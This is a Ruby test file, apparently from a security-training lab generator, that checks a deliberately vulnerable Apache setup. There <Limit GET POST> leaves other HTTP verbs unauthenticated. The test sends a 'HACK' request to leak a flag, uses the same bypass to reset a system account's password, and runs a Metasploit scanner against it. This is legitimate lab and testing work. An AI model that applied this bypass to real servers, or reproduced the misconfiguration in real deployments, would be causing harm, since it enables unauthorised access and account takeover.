require_relative '../../../../../lib/post_provision_test'
require 'base64'
require 'shellwords'

class ApacheVerbAuthBypassTest < PostProvisionTest
  # The apache module serves the vhost on port 80; not an input.
  PORT = 80
  # The protected admin page (see manifests/config.pp + the vhost config).
  ADMIN_PATH = '/admin.php'.freeze
  # An arbitrary verb: not GET/POST/HEAD, so <Limit GET POST> never challenges
  # it, and PHP still runs the page. This is the heart of the lab.
  BYPASS_VERB = 'HACK'.freeze

  def initialize
    self.module_name = 'apache_verb_auth_bypass'
    self.module_path = get_module_path(__FILE__)
    super
  end

  def test_module
    super

    # Inputs (see secgen_metadata.xml).
    username   = self.json_inputs['unix_username']&.first.to_s
    password   = self.json_inputs['used_password']&.first.to_s
    reset_user = self.json_inputs['reset_target_username']&.first.to_s
    flag       = self.json_inputs['strings_to_leak']&.first.to_s
                     .lines.map(&:strip).reject(&:empty?).first

    tier(1) do
      test_local_command('apache2 installed?', 'dpkg -l apache2 | grep -E "^ii"', 'apache2')
      test_local_command('mod_php installed?', 'dpkg -l libapache2-mod-php | grep -E "^ii"', 'libapache2-mod-php')
      # The misconfiguration itself is on disk: <Limit GET POST> round the page.
      test_local_command('<Limit GET POST> config present?',
                         "grep -rh 'Limit GET POST' /etc/apache2/ 2>/dev/null",
                         'Limit GET POST')
      test_local_command('htpasswd file present?',
                         'test -f /etc/apache2/.htpasswd && echo present', 'present')
      test_local_command('admin.php present?',
                         'test -f /var/www/html/admin.php && echo present', 'present')
      test_local_command('reset helper present?',
                         'test -x /usr/local/bin/panel_reset && echo present', 'present')
      test_local_command('sudoers rule present?',
                         'test -f /etc/sudoers.d/panel_reset && echo present', 'present')
    end

    tier(2) do
      test_service_up(port: PORT)

      # 1. A GET of the admin page is challenged for credentials (401).
      get = raw_http('GET', ADMIN_PATH)
      if get[:status] == '401' && get[:raw].include?('WWW-Authenticate')
        pass_check('GET requires auth',
                   "GET #{ADMIN_PATH} returned 401 with a WWW-Authenticate challenge", tier: 2)
      else
        fail_check('GET requires auth',
                   "GET #{ADMIN_PATH} returned #{get[:status].inspect}, expected a 401 Basic Auth challenge",
                   tier: 2, evidence: get[:raw][0, 400])
      end

      # 2. The bypass: an arbitrary verb reaches the page unauthenticated AND the
      #    page executes, so the first flag is returned without credentials. This
      #    is the whole point - <Limit GET POST> leaves every other verb open.
      if flag && !flag.empty?
        bypass = raw_http(BYPASS_VERB, ADMIN_PATH)
        if bypass[:status] == '200' && bypass[:raw].include?(flag)
          pass_check('verb bypass returns the admin page + flag',
                     "#{BYPASS_VERB} #{ADMIN_PATH} returned 200 without credentials and contained the flag", tier: 2)
        else
          fail_check('verb bypass returns the admin page + flag',
                     "#{BYPASS_VERB} #{ADMIN_PATH} returned #{bypass[:status].inspect} and did not contain the flag; the arbitrary verb may not be executing the page",
                     tier: 2, evidence: bypass[:raw][0, 400])
        end
      else
        skip_check('verb bypass returns the admin page + flag', 'no strings_to_leak input', tier: 2)
      end

      # 3. The impact: the same verb bypass drives the password-reset action (PHP
      #    reads the query string whatever the method), so an unauthenticated
      #    request changes a system account's password.
      if !reset_user.empty?
        before = run_command("getent shadow #{Shellwords.escape(reset_user)}")[:stdout].to_s.strip
        new_pw = 'Bypassed12345'
        raw_http(BYPASS_VERB, "#{ADMIN_PATH}?action=reset&user=#{reset_user}&pw=#{new_pw}")
        after = run_command("getent shadow #{Shellwords.escape(reset_user)}")[:stdout].to_s.strip
        after_hash = after.split(':')[1].to_s
        if !before.empty? && !after.empty? && before != after && after_hash.start_with?('$')
          pass_check('unauthenticated reset changes the account password',
                     "an unauthenticated #{BYPASS_VERB} request to the reset action changed #{reset_user}'s password hash", tier: 2)
        else
          fail_check('unauthenticated reset changes the account password',
                     "#{reset_user}'s shadow entry did not change after the reset request (before==after or no account present)",
                     tier: 2, evidence: "before: #{before.split(':').first}\nafter_hash_present: #{after_hash.start_with?('$')}")
        end
      else
        skip_check('unauthenticated reset changes the account password', 'no reset_target_username input', tier: 2)
      end
    end

    # Tier 3: prove the bypass is detectable with the stock MSF auxiliary scanner
    # from the attacker VM. This is an auxiliary/scanner module proving the
    # misconfiguration (not a session exploit), so it is driven with
    # run_msf_module and asserted here rather than via test_msf_exploit.
    #
    # The scanner baselines a GET of TARGETURI, continues only if that GET is
    # challenged with WWW-Authenticate, then retries each of
    # ['HEAD','TRACE','TRACK','Wmap','get','trace'] and reports a bypass for any
    # verb whose status differs from the GET's and is <= 302. TARGETURI MUST be
    # the protected page. With TraceEnable Off, HEAD folds into GET (401) but the
    # arbitrary verbs (TRACK/Wmap/get/trace) execute the page and return 200.
    tier(3) do
      aux = run_msf_module('auxiliary/scanner/http/verb_auth_bypass',
                           options: { 'TARGETURI' => ADMIN_PATH, 'RPORT' => PORT },
                           label: 'apache_verb_auth_bypass')
      next unless aux

      out = aux[:msf_output].to_s
      if out =~ /authentication bypass with verb/i
        verb = out[/authentication bypass with verb (\S+)/i, 1]
        pass_check('verb_auth_bypass confirms the bypass',
                   "auxiliary/scanner/http/verb_auth_bypass on #{aux[:attacker]} reported an authentication bypass (verb #{verb}) against #{aux[:rhost]}#{ADMIN_PATH}",
                   tier: 3)
      else
        fail_check('verb_auth_bypass confirms the bypass',
                   'No "authentication bypass with verb" finding in the scanner output; see the msf_output evidence.',
                   tier: 3)
      end
    end
  end

  private

  # Send one raw HTTP/1.0 request over /dev/tcp from inside the guest, so no HTTP
  # client (curl/wget) need be installed and any verb or header can be sent. The
  # request and the bash runner are passed as separate shell-escaped arguments,
  # the same pattern the base class's guest_http_get uses. Returns {status:, raw:}.
  def raw_http(method, path, auth: nil, host: '127.0.0.1', port: PORT)
    req = +"#{method} #{path} HTTP/1.0\\r\\nHost: #{host}\\r\\n"
    req << "Authorization: Basic #{auth}\\r\\n" if auth
    req << "Connection: close\\r\\n\\r\\n"
    script = "exec 3<>/dev/tcp/#{host}/#{port} && printf %b \"$1\" >&3 && cat <&3"
    cmd = "timeout 20 bash -c #{Shellwords.escape(script)} _ #{Shellwords.escape(req)}"
    out = run_command(cmd)[:stdout].to_s
    { status: out[%r{HTTP/\S+\s+(\d{3})}, 1], raw: out }
  end
end

ApacheVerbAuthBypassTest.new.run
